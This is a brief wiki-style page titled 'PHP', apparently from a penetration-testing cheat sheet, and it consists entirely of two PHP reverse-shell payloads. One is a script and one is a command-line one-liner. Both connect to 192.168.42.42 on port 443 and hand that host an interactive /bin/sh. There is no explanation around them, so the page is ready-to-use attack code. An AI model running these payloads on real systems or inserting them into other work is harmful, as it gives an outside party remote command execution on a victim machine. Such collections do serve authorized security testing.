---
title: "PHP"
date: 2025-10-02
draft: false
type: wiki
---

```php
<?php $sock = fsockopen("192.168.42.42","443"); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1
=>$sock, 2=>$sock), $pipes); ?>
```

-----------------------------

```php
php -r '$sock=fsockopen("192.168.42.42",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

-----------------------------
